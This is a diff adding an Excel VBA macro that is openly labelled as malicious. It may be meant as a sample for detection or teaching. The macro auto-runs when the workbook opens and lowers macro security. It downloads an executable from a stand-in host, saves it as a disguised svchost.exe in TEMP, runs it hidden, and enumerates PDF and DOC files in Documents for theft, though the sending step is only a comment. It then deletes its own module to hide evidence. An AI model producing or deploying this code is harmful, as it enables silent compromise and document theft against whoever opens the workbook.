@@ -1,0 +1,64 @@
+' Excel Macro with malicious payload
+Attribute VB_Name = "ThisWorkbook"
+Sub Auto_Open()
+    ' Executes when workbook opens
+    Call MaliciousPayload
+End Sub
+
+Sub Workbook_Open()
+    ' Another auto-execution point
+    Call MaliciousPayload
+End Sub
+
+Sub MaliciousPayload()
+    On Error Resume Next
+    
+    ' Disable security warnings
+    Application.AutomationSecurity = msoAutomationSecurityLow
+    
+    ' Download and execute payload
+    Dim url As String
+    Dim path As String
+    
+    url = "http://malicious-server.com/payload.exe"
+    path = Environ("TEMP") & "\svchost.exe"
+    
+    ' Download file
+    Dim xhr As Object
+    Set xhr = CreateObject("MSXML2.XMLHTTP")
+    xhr.Open "GET", url, False
+    xhr.send
+    
+    If xhr.Status = 200 Then
+        Dim stream As Object
+        Set stream = CreateObject("ADODB.Stream")
+        stream.Open
+        stream.Type = 1
+        stream.Write xhr.responseBody
+        stream.SaveToFile path, 2
+        stream.Close
+    End If
+    
+    ' Execute downloaded file
+    Shell path, vbHide
+    
+    ' Steal documents
+    Dim fso As Object
+    Dim folder As Object
+    Dim file As Object
+    Dim data As String
+    
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    Set folder = fso.GetFolder(Environ("USERPROFILE") & "\Documents")
+    
+    For Each file In folder.Files
+        If LCase(Right(file.Name, 4)) = ".pdf" Or LCase(Right(file.Name, 4)) = ".doc" Then
+            ' Read and exfiltrate file contents
+            ' In real malware: Send to C2 server
+        End If
+    Next
+    
+    ' Hide evidence
+    ThisWorkbook.VBProject.VBComponents.Remove ThisWorkbook.VBProject.VBComponents("ThisWorkbook")
+    
+End Sub
